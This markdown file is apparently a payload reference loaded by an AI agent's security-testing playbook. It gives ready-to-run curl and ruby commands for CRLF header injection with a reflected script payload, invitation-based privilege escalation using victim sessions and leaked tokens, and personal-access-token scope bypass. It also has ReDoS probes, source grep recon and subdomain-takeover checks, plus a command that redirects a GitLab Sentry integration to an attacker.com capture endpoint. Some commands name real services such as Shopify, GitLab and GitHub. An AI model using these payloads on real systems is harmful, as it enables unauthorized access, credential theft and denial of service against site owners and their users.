# misc — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payload & Detection Patterns



**CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**

```bash

# Test CRLF in header values

curl -v "https://target.com/path" \

  -H $'X-Custom: value\r\nInjected-Header: evil'



# URL-encoded variant

curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"



# Test in pitchfork/Rack apps — inject via query param reflected in Location header

curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"

```



**Privilege escalation via invitation bypass:**

```bash

# Accept invitation without email verification

curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \

  -H "Cookie: session=UNVERIFIED_SESSION" \

  -d '{"role":"admin"}'



# Test invitation token for another user

curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \

  -H "Cookie: session=VICTIM_SESSION"

```



**Token scope bypass (GitHub/GitLab PAT):**

```bash

# Call privileged endpoint with minimal-scope token

curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \

  "https://api.github.com/repos/org/private-repo/issues"



# Test suspended installation access

curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \

  "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"

```



**SSRF via config URL fields (Sentry integration):**

```bash

# Change Sentry URL to internal listener

curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \

  -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \

  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'

```



**ReDoS detection:**

```bash

# Test Ruby URI parser

ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'



# Test IPAddr

ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'



# Timing-based detection

time curl "https://target.com/search?q=aaaa" # baseline

time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"

```



**Grep patterns for source recon:**

```bash

# Find SAML signature verification

grep -r "validate_signature\|verify_signature\|skip.*signature" --include="*.rb"



# Find hardcoded or weak scope checks

grep -r "without_scope\|any_scope\|scope.*bypass" --include="*.rb"



# Find invitation acceptance without verification

grep -r "accept.*invitation\|invitation.*accept" --include="*.rb" | grep -v "verified\|confirmed"



# Find internal API routes

grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js"

```



**Dangling subdomain / DNS check:**

```bash

# Check for obsolete DNS records

dig CNAME handbook.gitlab.com

curl -sI https://handbook.gitlab.com | head -5

# Look for NXDOMAIN or 404 on hosting provider = takeover candidate



# SPF check

dig TXT rubylang.org | grep spf

# Missing or ~all = email spoofing risk

```



---
